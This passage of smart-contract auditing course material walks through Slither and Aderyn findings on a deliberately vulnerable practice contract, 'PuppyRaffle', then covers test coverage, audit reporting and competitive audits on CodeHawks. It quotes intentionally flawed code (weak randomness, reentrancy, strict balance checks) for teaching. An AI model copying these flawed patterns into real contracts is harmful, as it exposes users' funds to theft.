          "markdownContent": "---\ntitle: Slither Walkthrough\n---\n\n_Follow along with this video:_\n\n---\n\n### Slither Static Analysis\n\nAlright, let's take a closer look at some of the issues Slither was able to find in our code base earlier. These will include, but aren't limited to, each of these.\n\n- Using incorrect Solidity versions\n- Missing/wrong events\n- Event reentrancy\n- Zero address checks\n- Supply chain attacks\n- Cache storage variables for loops\n- Unchanged variables marked as immutable or constant\n\nStart by running `slither .` just as before and let's dive into the output starting at the most severe\n\n### Slither Highs\n\n<img src=\"/security-section-4/40-slither-walkthrough/slither-walkthrough1.png\" width=\"75%\" height=auto>\n\n**1. Sends Eth to Arbitrary User**\n\n- Dangerous Calls: `(success) = feeAddress.call{value: feesToWithdraw}() (src/PuppyRaffle.sol#160)`\n\nTaking a look at this call in our code base, we see it's in the `withdrawFees` function.\n\n```js\nfunction withdrawFees() external {\n    require(address(this).balance == uint256(totalFees), \"PuppyRaffle: There are currently players active!\");\n    uint256 feesToWithdraw = totalFees;\n    totalFees = 0;\n    // (bool success,) = feeAddress.call{value: feesToWithdraw}(\"\");\n    require(success, \"PuppyRaffle: Failed to withdraw fees\");\n}\n```\n\nSo, `Slither` is telling us that our feeAddress is arbirary and may be malicious. Let's look at the attack vector in the [**`Slither` documentation**](https://github.com/crytic/slither/wiki/Detector-Documentation#functions-that-send-ether-to-arbitrary-destinations).\n\nThe documentation outlines that since our `feeAddress` can be changed, whomever receives funds from `withdrawFees` could theoretically be anybody. However, in `PuppyRaffle`, the `feeAddress` can only be changed by the `owner`, so this would be considereed intention in our protocol.\n\n```js\nfunction changeFeeAddress(address newFeeAddress) external onlyOwner {\n    feeAddress = newFeeAddress;\n    emit FeeAddressChanged(newFeeAddress);\n}\n```\n\nConveniently, by using the syntax `// slither-disable-next-line [DETECTOR_NAME]`, we can tell Slither to ignore this warning:\n\n```js\n// slither-disable-next-line arbitrary-send-eth\n(bool success,) = feeAddress.call{value: feesToWithdraw}(\"\")\n```\n\n**2. Uses a Weak PRNG**\n\n- Dangerous Calls:\n  - `winnerIndex = uint256(keccak256(bytes)(abi.encodePacked(msg.sender,block.timestamp,block.difficulty))) % players.length (src/PuppyRaffle.sol#127-128)`\n\nThis is the same vulnerability we detected! We can have slither ignore this line with:\n\n```js\n// slither-disable-next-line weak-prng\nuint256 winnerIndex =\nuint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;\n```\n\n### Slither Mediums\n\n<img src=\"/security-section-4/40-slither-walkthrough/slither-walkthrough2.png\" width=\"75%\" height=auto>\n\n**1. Performs a Multiplication on the Result of a Division**\n\n- Dangerous Calls:\n  - `encodedLen = 4 * ((data.length + 2) / 3) (lib/base64/base64.sol#22)`\n  - `decodedLen = (data.length / 4) * 3 (lib/base64/base64.sol#78)`\n\nThese issues are actually being detected in one of the libraries we're using, `Base64`. For the purposes of this section, we won't be going through our libraries, but what I want you to take away is that we need to assure our libraries, inheritances and dependencies are compatible, and these are generally warnings that are worth investigation.\n\nYou can have slither ignore these by navigating to `lib/base64/base64.sol#22` and `lib/base64/base64.sol#78` to prepend the line:\n\n```js\n// slither-disable-next-line divide-before-multiply\n```\n\n**2. Uses a Dangerous Strict Equality**\n\n- Dangerous Calls:\n  - `require(bool,string)(address(this).balance == uint256(totalFees),PuppyRaffle: There are currently players active!) (src/PuppyRaffle.sol#158)`\n\nThis is another one we caught during our manual review! The warning here is pointing to our previous `Mishandling of Eth` finding.\n\nWe can have slither ignore this warning with:\n\n```js\n// slither-disable-next-line incorrect-equality\n```\n\n**3. Reentrancy in PuppyRaffle.refund(uint256)**\n\n- Dangerous Calls:\n  - External calls:\n    - `address(msg.sender).sendValue(entranceFee) (src/PuppyRaffle.sol#102)`\n  - State variables written after the call(s):\n    - `players[playerIndex] = address(0) (src/PuppyRaffle.sol#104)`\n\nWe found this one too! Don't get me started talking about reentrancy again. Know it, protect against it.\n\nYou can have `Slither` ignore this one by adding this to the line before our external call:\n\n```js\n// slither-disable-next-line reentrancy-no-eth\npayable(msg.sender).sendValue(entranceFee);\n```\n\n**4. Ignores Return Value by {function call}**\n\n- Dangerous Calls:\n- <details>\n  <summary>Call Summary</summary>\n\n  - `(tokenId) = _tokenOwners.at(index) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#181)`\n\n  - `_holderTokens[to].add(tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#339)`\n  - `_tokenOwners.set(tokenId,to) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#341)`\n  - `_holderTokens[owner].remove(tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#369)`\n  - `_tokenOwners.remove(tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#371)`\n  - `_holderTokens[from].remove(tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#396)`\n  - `_holderTokens[to].add(tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#397)`\n  - `_tokenOwners.set(tokenId,to) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#399)`\n  </details>\n\n---\n\nYou can remove these warning from your `Slither` report by navigating to the respective lines for each call in the library and adding:\n\n```js\n// slither-disable-next-line unused-return\n```\n\n### Slither Lows\n\n<img src=\"/security-section-4/40-slither-walkthrough/slither-walkthrough3.png\" width=\"75%\" height=auto>\n\n**1. Lacks a Zero Check**\n\n- Dangerous Calls:\n  - `feeAddress = _feeAddress (src/PuppyRaffle.sol#63)`\n  - `feeAddress = newFeeAddress (src/PuppyRaffle.sol#170)`\n\n`feeAddress` is assigned in our `constructor` and the `changeFeeAddress` function. `Slither` is advising that we include a check to assure the `feeAddress` isn't being set to `address(0)`.\n\nThat sounds like a valid informational finding to me. Let's add it to our notes above each function!\n\n```js\n// @Audit: Info - check for zero address when setting feeAddress\n```\n\nThese sorts of finds are often referred to as `input validation` and the severity is typically deemed informational.\n\nWe can have our `Slither` report remove these warnings once we've made note of them, but adding this line to `PuppyRaffle` before assigning our `feeAddress` in our `constructor` and the `changeFeeAddress` functions:\n\n```js\n// slither-disable-next-line missing-zero-check\n```\n\n**2. Reentrancy in PuppyRaffle.refund/selectWinner**\n\n- Dangerous Calls: - <details open>\n  <summary>Call Summary</summary>\n  PuppyRaffle.refund\n\n          - `address(msg.sender).sendValue(entranceFee) (src/PuppyRaffle.sol#103)`\n\n          PuppyRaffle.selectWinner\n\n          -  `(success) = winner.call{value: prizePool}() (src/PuppyRaffle.sol#152)`\n          - `_safeMint(winner,tokenId) (src/PuppyRaffle.sol#154)`\n          - `returndata = to.functionCall(abi.encodeWithSelector(IERC721Receiver(to).onERC721Received.selector,_msgSender(),from,tokenId,_data),ERC721: transfer to non ERC721Receiver implementer) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#447-450)`\n          - `(success,returndata) = target.call{value: value}(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#119)`\n        </details>\n\n        ---\n\n  Now, you may be asking yourself _These are reentrancy, why aren't they high!?_.\n\nWell, these warnings are specifically pointing to the vulnerability described by the manipulation of the order or value of events being emitted. By reentering these functions an attacker is able to manupulate the events being emitted and potentially compromise third party reliance on them.\n\nThere's a lot of debate about what kind of severity should be ascribed to event based findings, but my personal rule of thumb is that they are _at least_ `Low Severity`. Examples include:\n\n- If an event can be manipulated\n- If an event is missing\n- If an event is wrong\n\nI would add these to my notes for an audit report.\n\n```js\n// @Audit: Low - Events affected by reentrancy\n```\n\nWe can remove these warnings from `Slither` by navigating to the reported lines and adding the following as appropriate:\n\n```js\n// slither-disable-next-line reentrancy-events\n```\n\nIn your refund function, you may try to disable 2 checks for the same line. In order to do this, separate your ignore directives with a comma:\n\n```js\n// slither-disable-next-line reentrancy-no-eth, reentrancy-events\n```\n\n**3. Uses Timestamp for Comparisons**\n\n- Dangerous Calls:\n  - `require(bool, string)(block.timestamp >= raffleStartTime + raffleDuration, PuppyRaffle: Raffle not over) (src/PuppyRaffle.sol#136)`\n\nTechnically relying on `block.timestamp` means this _would_ be vulnerable to manipulation, but realistically only by a few seconds. For the purposes of this section we'll ignore it for now.\n\nYou can have `Slither` ignore it too with:\n\n```js\n// slither-disable-next-line timestamp\n```\n\n**4. Uses Assembly**\n\n- Dangerous Calls:\n  - `INLINE ASM (lib/base64/base64.sol#28-63)`\n  - `INLINE ASM (lib/base64/base64.sol#84-126)`\n  - `INLINE ASM (lib/openzeppelin-contracts/contracts/utils/Address.sol#33)`\n  - `INLINE ASM (lib/openzeppelin-contracts/contracts/utils/Address.sol#180-183)`\n\nIn short - Slither doesn't like Assembly. We'll be going over Assembly much later in this course, for now we'll be ignoring these warnings.\n\nYou can remove these detectors/warnings by adding the following to the appropriate lines:\n\n```js\n// slither-disable-next-line assembly\n```\n\n**5. Different Versions of Solidity Are Used**\n\n- Dangerous Calls:\n\n  - <details>\n      <summary>Call Summary</summary>\n\n    - `Version used: ['>=0.6.0', '>=0.6.0<0.8.0', '>=0.6.2<0.8.0', '^0.7.6']`\n    - `>=0.6.0 (lib/base64/base64.sol#3)`\n    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/access/Ownable.sol#3)`\n    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/introspection/ERC165.sol#3)`\n    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/introspection/IERC165.sol#3)`\n    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/math/SafeMath.sol#3)`\n    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#3)`\n    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol#3)`\n    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/Context.sol#3)`\n    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/EnumerableMap.sol#3)`\n    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/EnumerableSet.sol#3)`\n    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/Strings.sol#3)`\n    - `>=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol#3)`\n    - `>=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Enumerable.sol#3)`\n    - `>=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Metadata.sol#3)`\n    - `>=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/utils/Address.sol#3)`\n    - `^0.7.6 (src/PuppyRaffle.sol#2)`\n\n  </details>\n\nThis is where `Slither` is pointing out the `Floating Pragma` vulnerability we outlined earlier. This will definitely be going in our report as an informational finding.\n\nUnfortunately `Slither` doesn't offer a per-file or line disabling of this detector, but we can remove it by adding the following to a `.slither.config.json` that we create:\n\n```js\n\n\"detectors_to_exclude\":[\n    \"solc-version\"\n]\n\n```\n\nThen add this line to the appropriate files:\n\n```js\n// slither-disable-next-line pragma,solc-version\n```\n\n**6. solc 0.7.6 is not Recommended for Deployment**\n\n- Dangerous Calls:\n  - `PuppyRaffle.sol solc version 0.7.6`\n\nSlither's documentation tells us that this is an old version of Solidity and that we're not taking advantage of Solidity updates or new security checks. This is a great finding and should definitely be added to our report.\n\n```js\n// @Audit: Info - Should use updated solv version such as 0.8.18\n```\n\n**7. {function} is Never Used and Should be Removed**\n\n- Dangerous Calls\n  - `PuppyRaffle._isActivePlayer() (src/PuppyRaffle.sol#180-187)`\n\nWe called this one out as an informational/gas finding as well. You can disable this detector in `Slither` by adding this line above the function:\n\n```js\n// slither-disable-next-line dead-code\n```\n\n**8. Low Level Call**\n\n- Dangerous Calls:\n\n  - <details>\n    <summary>Call Summary</summary>\n\n    - `(success) = recipient.call{value: amount}() (lib/openzeppelin-contracts/contracts/utils/Address.sol#60)`\n    - `(success,returndata) = target.call{value: value}(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#128)`\n    - `(success,returndata) = target.staticcall(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#156)`\n    - `(success,returndata) = target.delegatecall(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#183)`\n    - `(success) = winner.call{value: prizePool}() (src/PuppyRaffle.sol#154)`\n    - `(success) = feeAddress.call{value: feesToWithdraw}() (src/PuppyRaffle.sol#167)`\n    </details>\n\n---\n\nMuch like Assembly, `Slither` doesn't like low level calls. We'll be ignoring these for now, but you can remove them from your warnings by applying this line above the described calls.\n\n```js\n// slither-disable-next-line low-level-calls\n```\n\n**9. Not in mixedCase**\n\n- Dangerous Calls:\n  - `Parameter Base64.decode(string)._data (lib/base64/base64.sol#68)`\n  - `Parameter ERC721.safeTransferFrom(address,address,uint256,bytes)._data (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#247)`\n\nThese are simply pointing out naming convention concerns in a couple of our libraries. We'll ignore these as well, but you can remove them from the `Slither` warnings with:\n\n```js\n// slither-disable-next-line naming-convention\n```\n\n**10. Redundant Expression**\n\n- Dangerous Calls:\n  - `\"this (lib/openzeppelin-contracts/contracts/utils/Context.sol#21)\" inContext (lib/openzeppelin-contracts/contracts/utils/Context.sol#15-24)`\n\nAnother warning from a depedency of ours, we'll ignore this, but if you want to remove it you can add the line:\n\n```js\n// slither-disable-next-line redundant-statements\n```\n\n**11. Variable is Too Similar**\n\n- Dangerous Calls\n  - `Base64.TABLE_DECODE (lib/base64/base64.sol#10-13) is too similar to Base64.TABLE_ENCODE (lib/base64/base64.sol#9)`\n\n**_ANOTHER_** warning from the libraries we're using. We can remove it with this line:\n\n```js\n// slither-disable-next-line similar-names\n```\n\nNow, at this point, you're probably annoyed by all the libraries `Slither` has been catching things in. What if I told you there's a better way to exclude them all at once?!\n\nBy running `Slither . --exclude-dependencies` we can actually run our tool and have it ignore anything detected in our imports!\n\n**12. Cached Array Length**\n\n- Dangerous Calls:\n  - `Loop condition j < players.length (src/PuppyRaffle.sol#90)`\n  - `Loop condition i < players.length (src/PuppyRaffle.sol#114)`\n  - `Loop condition i < players.length (src/PuppyRaffle.sol#182)`\n\nHere's a vulnerability we missed!\n\nAny time we're looping through players.length in this way, we're using far more gas than should be necessary. We should cache this value so we're only calling it from storage once.\n\n```js\n// @Audit: We should cache the players.length array when looping - uint256 playersLength = players.length;\n```\n\nWe can remove this warning from the `Slither` report by adding this line before our loops:\n\n```js\n// slither-disable-next-line cache-array-length\n```\n\n**13. Storage Variables can be Declares Constant**\n\n- Dangerous Calls:\n  - `PuppyRaffle.commonImageUri (src/PuppyRaffle.sol#40)`\n  - `PuppyRaffle.legendaryImageUri (src/PuppyRaffle.sol#50)`\n  - `PuppyRaffle.rareImageUri (src/PuppyRaffle.sol#45)`\n\nA great finding, absolutely these storage variables should be constants, we're setting them once and they never change, a big potential gas savings.\n\n```js\n// @Audit: These Storage Variables can be Constants\nstring private commonImageUri = \"ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8\"\nstring private rareImageUri = \"ipfs://QmUPjADFGEKmfohdTaNcWhp7VGk26h5jXDA7v3VtTnTLcW\";\nstring private legendaryImageUri = \"ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU\";\n```\n\nWe can filter these warnings from our `Slither` report with the line:\n\n```js\n// slither-disable-next-line\n```\n\n**14. State Variables can be Immutable** - Dangerous Calls: - `PuppyRaffle.raffleDuration (src/PuppyRaffle.sol#25)`\n\nLikewise, this is a great call by `Slither` our raffleDuration is being set once and cannot be changed. Setting this to immutable would offer additional gas savings. Absolutely added to the report.\n\n```js\n// @Audit: Unchanging state variables can be declared as immutable\nuint256 public raffleDuration;\n```\n\nThis warning can be removed from the `Slither` report with:\n\n```js\n// slither-disable-next-line immutable-states\n```\n\n### Wrap Up\n\nWow. This may have seemed a bit tedious, but look how much we've found and how much better we understand what `Slither` is able to detect. `Slither`, if nothing else, is great at finding gas optimizations, but beyond that it found issues we thought we needed to manually review for.\n\nHad PuppyRaffle ran `Slither` before coming to audit, their code base would have been in a much better starting place.\n\nUp next, let's see what `Aderyn` can do for Puppy Raffle!\n",
          "updates": []
        },
        {
          "lessonId": "3968e2b8-4bc5-445c-83f8-2841f2eb3ae3",
          "number": 41,
          "title": "Aderyn walkthrough",
          "slug": "aderyn-walkthrough",
          "folderName": "41-aderyn-walkthrough",
          "description": "",
          "duration": 3,
          "videoUrl": "jCUWPhEGzeaIcp5dJhEw4g7l8aJ4NOf00CgKD5G7Cq00Q",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/41-aderyn-walkthrough/+page.md",
          "markdownContent": "---\ntitle: Aderyn Walkthrough\n---\n\n_Follow along with this video:_\n\n---\n\n### Aderyn Static Analysis\n\nNext, let's see what `Aderyn` can do for the Puppy Raffle repo. We'll assess each of the findings in turn. Some of which will include:\n\n- Centralization Risks\n- Dynamic Types & abi.encodePacked\n- Non-Indexed Events\n\nWe can start by running `aderyn .`. This should generate an already formatted markdown report for us. Once run, open `report.md`\n\n### Aderyn Mediums\n\n**1. Centralization Risk for Trusted Owners**\n\n- Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 180](src/PuppyRaffle.sol#L180)\n\n      ```solidity\n          function changeFeeAddress(address newFeeAddress) external onlyOwner {\n      ```\n\n  This vulnerability is likely to crop up more and more as time goes on, unfortunately. In the context of Puppy Raffle, we're going to ignore it, all the owner can really do is change the feeAddress. This is absolutely something that should be called out in private audits.\n\n### Aderyn Lows\n\n**1. `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`**\n\n- Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 213](src/PuppyRaffle.sol#L213)\n\n      ```solidity\n                  abi.encodePacked(\n      ```\n\n      - Found in src/PuppyRaffle.sol [Line: 217](src/PuppyRaffle.sol#L217)\n\n      ```solidity\n                              abi.encodePacked(\n      ```\n\n  `Aderyn` here is pointing out that we should only use `encodePacked` for appropriate circumstances and that `encode` should be preferred to avoid hash collisions. We're going to ignore this for the purposes of this course, but I encourage you to investigate further to understand the reasoning here and find examples of hash collisions yourself.\n\n**2. Solidity pragma should be specific, not wide**\n\n- Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 3](src/PuppyRaffle.sol#L3)\n\n      ```solidity\n      pragma solidity ^0.7.6;\n      ```\n\n  We got this one! This is the same as our `Floating Pragma` finding.\n\n### Aderyn Informational/Gas\n\n**1. Missing checks for `address(0)` when assigning values to address state variables**\n\n- Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 69](src/PuppyRaffle.sol#L69)\n\n      ```solidity\n              feeAddress = _feeAddress;\n      ```\n\n      - Found in src/PuppyRaffle.sol [Line: 159](src/PuppyRaffle.sol#L159)\n\n      ```solidity\n              previousWinner = winner;\n      ```\n\n      - Found in src/PuppyRaffle.sol [Line: 182](src/PuppyRaffle.sol#L182)\n\n      ```solidity\n              feeAddress = newFeeAddress;\n      ```\n\n  We got this one! `zero address checks` wil be a common topic in security reviews you do. Familiarize yourself with spotting them!\n\n**2. Functions not used internally could be marked external**\n\n- Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 86](src/PuppyRaffle.sol#L86)\n\n      ```solidity\n          function enterRaffle(address[] memory newPlayers) public payable {\n      ```\n\n      - Found in src/PuppyRaffle.sol [Line: 105](src/PuppyRaffle.sol#L105)\n\n      ```solidity\n          function refund(uint256 playerIndex) public {\n      ```\n\n      - Found in src/PuppyRaffle.sol [Line: 205](src/PuppyRaffle.sol#L205)\n\n      ```solidity\n          function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\n      ```\n\n  Puppy Raffle has these function marked as `public`, which is _fine_, but if they aren't used internally as well as externally, we can just mark them as `external` for a small gas savings.\n\n> **Note:** In the video, I assume this is referencing the `_getActivePlayer` function that is unused. Whoops!\n\n**3. Constants should be defined and used instead of literals**\n\n- Dangerous Calls - Found in src/PuppyRaffle.sol [Line: 94](src/PuppyRaffle.sol#L94)\n  `solidity\n    for (uint256 i = 0; i < players.length - 1; i++) {\n    `\n\n      - Found in src/PuppyRaffle.sol [Line: 96](src/PuppyRaffle.sol#L96)\n\n      ```solidity\n      for (uint256 j = i + 1; j < players.length; j++) {\n      ```\n\n      - Found in src/PuppyRaffle.sol [Line: 141](src/PuppyRaffle.sol#L141)\n\n      ```solidity\n      uint256 prizePool = (totalAmountCollected * 80) / 100;\n      ```\n      - Found in src/PuppyRaffle.sol [Line: 142](src/PuppyRaffle.sol#L142)\n\n      ```solidity\n          uint256 fee = (totalAmountCollected * 20) / 100;\n      ```\n      - Found in src/PuppyRaffle.sol [Line: 148](src/PuppyRaffle.sol#L148)\n\n      ```solidity\n          uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;\n      ```\n\n  `Aderyn` was a little too vigilant here, catching the `Magic Numbers` used in our for loops, but it also caught a `Magic Numbers` in the `prizePool` and `fee` calculations as well! We got this one earlier.\n\n**4. Event is missing `indexed` fields**\n\n- Dangerous Calls: - Found in src/PuppyRaffle.sol [Line: 59](src/PuppyRaffle.sol#L59)\n\n      ```solidity\n          event RaffleEnter(address[] newPlayers);\n      ```\n\n      - Found in src/PuppyRaffle.sol [Line: 60](src/PuppyRaffle.sol#L60)\n\n      ```solidity\n          event RaffleRefunded(address player);\n      ```\n\n      - Found in src/PuppyRaffle.sol [Line: 61](src/PuppyRaffle.sol#L61)\n\n      ```solidity\n          event FeeAddressChanged(address newFeeAddress);\n      ```\n\n  Indexing fields ultimately makes it easier for off-chain tools to access the emitted event data. Indexing event parameters costs more gas however, so there's a trade-off. Not using indexed fields could be defended as a design choice, but in an ideal world, they would be indexed.\n\n### Wrap Up\n\nThat was quick! `Aderyn` is great in that this output is already formatted beautifully and we could reasonably just copy and paste it's finding into our report. Going through the outlined issues is a good practice however, as these static analysis tools paint with wide strokes and not everything caught may be applicable or valid.\n",
          "updates": []
        },
        {
          "lessonId": "f012efb6-1547-4ce9-add5-cfcf024f0730",
          "number": 42,
          "title": "Test coverage",
          "slug": "test-coverage",
          "folderName": "42-test-coverage",
          "description": "",
          "duration": 1,
          "videoUrl": "JbFWxsW4022U1kVcBMt00K3To7nnnWPrCAjYc5DaQMnKI",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/42-test-coverage/+page.md",
          "markdownContent": "---\ntitle: Test Coverage\n---\n\n_Follow along with this video:_\n\n---\n\n### Checking Coverage\n\nAlright! Let's see where we're at in our roadmap\n\n```\nSlither âœ…\nAderyn âœ…\nCode Quality/Tests\n---\nReporting\n- Competitive Audits\n    - Submit a finding\n- Puppy Raffle Report incl. PoC\n```\n\nTest coverage is up next, this should be easy.\n\n> **Remember:** you can check test coverage with the command `forge coverage`.\n\n<img src=\"../../../../static/security-section-4/42-test-coverage/test-coverage1.png\" width=\"100%\" height=\"auto\">\n\nThis is ... pretty bad. In the context of a competitive audit, this may be less important, but in a private audit we should absolutely be calling this out as an informational. Assuring a repo has an adequate test coverage helps a protocol avoid overlooking areas of their code.\n\nIn the next lesson, we'll be going over some details to ready ourselves for writing this report. Exciting!\n",
          "updates": []
        },
        {
          "lessonId": "605f8320-1990-46eb-9a42-8ec0f0b978a5",
          "number": 43,
          "title": "Phase 4: Reporting primer",
          "slug": "phase-4-reporting-primer",
          "folderName": "43-phase-4-reporting-primer",
          "description": "",
          "duration": 3,
          "videoUrl": "Jsp4X635wKDgIIYVDaoduT02qoDZgaQMvikfwJsy49PY",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/43-phase-4-reporting-primer/+page.md",
          "markdownContent": "---\ntitle: Phase 4 Reporting - Primer\n---\n\n_Follow along with this video:_\n\n---\n\n### Writing the Report\n\nAs was mentioned before - you can always look at one more line of code, but at some point, you got to _write the report_.\n\nNow, we're satisfied with our review, we're happy with the job we did. Lets write things up. We're going to go through the report together again as this is a crucial skill for your future security researcher career.\n\nIn audits and especially in bug bounties, it is your obligation to convince the protocol of the importance of your finding and the need for it to be fixed. Writing detailed and thorough audit reports is the avenue through which we do this.\n\nBUT. Before we walkthrough another report, I want to introduce you to competitive audits. We're going to go over what they are, how they differ from private audits and how to submit a finding for them.\n\n<img src=\"/security-section-4/43-reporting-primer/reporting-primer1.svg\" width=\"75%\" height=\"auto\">\n\n---\n\nFor now - if you've been binging this course, I want you to pause and go for a walk. It's time to take a break and reward ourselves for how far we've come. We've learnt so much, and we've so much more to go.\n\nSee you after your break!\n",
          "updates": []
        },
        {
          "lessonId": "ecc11bfc-759f-4cd7-9056-9de865bdbb07",
          "number": 44,
          "title": "What is a competitive audit?",
          "slug": "what-is-a-competitive-audit",
          "folderName": "44-what-is-a-competitive-audit",
          "description": "",
          "duration": 5,
          "videoUrl": "dsk3T5vbxU02jH492Jcf9ZY8fWsTRw01Rm00rOn02CNzXBo",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/44-what-is-a-competitive-audit/+page.md",
          "markdownContent": "---\ntitle: What is a Competitive Audit?\n---\n\n_Follow along with this video:_\n\n---\n\n### Competitive vs Private Audits\n\nBefore we get to our report, I want to illustrate what a competitive audit is, and how it may differ from a private audit.\n\n**_What is a competitive audit?_**\n\nUnlike a private audit, where a single security researcher (or a small team) would be working with a protocol directly, a competitive audit sees a protocol making their code base publicly available and having people compete to find vulnerabilities within it.\n\nI encourage you to checkout some of the past competitive audits on [**CodeHawks**](https://www.codehawks.com/contests), you can click 'View Final Report' To see a compilation of all the findings in a contest, who found it etc.\n\nIn a competitive audit, you're competing to find _bugs_, you're paid if you find vulnerabilities.\n\nWe can see how these payouts work by looking at the [**CodeHawks Docs**](https://docs.codehawks.com/). Findings rewards are ultimately broken down into shares and severity, where the system rewards finding more unique, difficult to find bugs.\n\n<img src=\"/security-section-4/44-what-is-a-competitive-audit/competitive-audit1.png\" width=\"75%\" height=\"auto\">\n\nYou can also find examples of scenarios and calculations on the [**CodeHawks Docs**](https://docs.codehawks.com/hawks-auditors/payouts).\n\n**_How good are competitive audits?_**\n\nThe quality of competitive audits has been found to be - incredible. To use a past contest on CodeHawks as an example, the Beedle-Fi audit resulted in a staggering number of findings.\n\n<img src=\"/security-section-4/44-what-is-a-competitive-audit/competitive-audit2.png\" width=\"75%\" height=\"auto\">\n\nSecurity reviews of this nature consistently find more bugs that private reviews _and_ they serve as the perfect platforms to gain experience and build your security researcher career.\n\nMany top security researchers started their careers in this space, and continue to compete in competitive audits throughout.\n\nCompetitive audits are a tonne of fun, you can learn lots and of course you can win money.\n\n**_How do I start with competitive audits?_**\n\nI'm glad you asked! CodeHawks hosts events called [**First Flights**](https://www.codehawks.com/first-flights), and we're going to have you do some of these!\n\nFirst Flights are simplified code bases (just like Puppy Raffle) that have been built specifically to ease newcomers into the auditing process, familiarize them with how competitive audits work and afford auditors an effective avenue through which to learn and grow their skills with real world experience.\n\nOne additional benefit to using competitive audits as a platform to improve your skills is, once one concludes, all the validated findings are viewable, allowing an auditor to see which vulnerabilities they missed and how others are reporting their findings. This is hugely valuable for those looking to expand their skills.\n\nIn the next lesson we'll sign up for CodeHawks together!\n",
          "updates": []
        },
        {
          "lessonId": "9c485ab8-c99e-4dec-8dfc-267bdf536d45",
          "number": 45,
          "title": "Codehawks",
          "slug": "codehawks",
          "folderName": "45-codehawks",
          "description": "",
          "duration": 3,
          "videoUrl": "dfOozck01i7mh194rjsDXe9K02XLvi7UQgIO8Qd02zqYU8",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/45-codehawks/+page.md",
          "markdownContent": "---\ntitle: CodeHawks\n---\n\n_Follow along with this video:_\n\n---\n\n### Getting Ready to Compete\n\nWith a better understanding of what a competitive audit is, I'll tell you - you have the skills _right now_ to start competing and start participating in some of these contests, especially First Flights.\n\nDon't hesitate to jump in and get as much experience actually going through these processes as you can.\n\n### Sign Up\n\nYour first step, of course will be to sign up to CodeHawks and create an account. You can begin by clicking `Become a Hawk` on the [**CodeHawks Homepage**](https://www.codehawks.com/)\n\n<img src=\"/security-section-4/45-codehawks/codehawks1.png\" style=\"width: 75%; height: auto;\">\n\nConnect the browser wallet of your choice when prompted and then fill out your profile information.\n\n<img src=\"/security-section-4/45-codehawks/codehawks2.png\" style=\"width: 75%; height: auto;\">\n\n> **Note:** CodeHawks pays out on Arbitrum in USDC, so ensure you're using an EVM compatible wallet to receive rewards!\n\nOnce your details are entered, click the `Sign Up` button at the bottom, your wallet will pop up and you'll be prompted to sign a transaction (no fees).\n\nYou'll then receive a notification to verify your email, but following that **you're all done!** That's all it takes to get started with participating in competitive audits on the CodeHawks platform, and you already possess the basic skills to get involved.\n\nLet's go over how to submit a finding in a competitive audit so you're truly prepared to jump in!\n",
          "updates": []
        },
        {
          "lessonId": "90ec3130-455a-483a-b279-35da3f014021",
          "number": 46,
          "title": "Submitting a competitive audit finding",
          "slug": "submitting-a-competitive-audit-finding",
          "folderName": "46-submitting-a-competitive-audit-finding",
          "description": "",
          "duration": 4,
          "videoUrl": "X4Q9e4slmU9pL01rPBnKYmRGk2rtOM13FqBcATBlIRuE",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/46-submitting-a-competitive-audit-finding/+page.md",
